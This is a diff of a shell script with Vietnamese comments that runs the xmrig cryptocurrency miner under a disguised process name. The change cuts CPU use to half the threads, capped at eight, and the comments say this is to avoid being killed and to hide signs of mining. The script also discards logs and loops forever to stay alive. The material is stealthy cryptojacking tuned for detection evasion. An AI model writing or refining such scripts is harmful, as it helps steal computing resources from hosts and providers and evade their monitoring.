@@ -17,13 +17,25 @@ fi
 cp xmrig $FAKE_NAME
 chmod +x $FAKE_NAME
 
-# Sử dụng toàn bộ luồng CPU
-CORES_TO_USE=$(nproc)
+# Chỉ sử dụng một phần CPU để tránh bị kill (giảm dấu hiệu "khai thác")
+TOTAL_CORES=$(nproc)
+# Dùng 50% số luồng hoặc tối đa 8 luồng (tùy cái nào nhỏ hơn)
+CORES_TO_USE=$((TOTAL_CORES / 2))
+if [ $CORES_TO_USE -gt 8 ]; then
+    CORES_TO_USE=8
+fi
 
 echo "[*] Đang chạy tiến trình '$FAKE_NAME' sử dụng $CORES_TO_USE luồng CPU..."
 
-# Chạy miner với full CPU, tắt donate, log nhẹ để không làm chậm
-./$FAKE_NAME -o $POOL_URL -u $WALLET -k --tls --donate-level 0 --cpu-max-threads-hint=$CORES_TO_USE --randomx-1gb-pages --randomx-no-numa --threads=$CORES_TO_USE --log-file=/dev/null &
+# Chạy miner, KHÔNG dùng 1GB pages để tránh lỗi bị kill
+./$FAKE_NAME -o $POOL_URL -u $WALLET -k --tls --donate-level 0 \
+    --cpu-max-threads-hint=$CORES_TO_USE \
+    --randomx-no-numa \
+    --threads=$CORES_TO_USE \
+    --log-file=/dev/null &
+
+# In PID của tiến trình miner
+echo "[*] Miner đang chạy với PID: $!"
 
 # Giữ script sống
 while true; do sleep 60; done
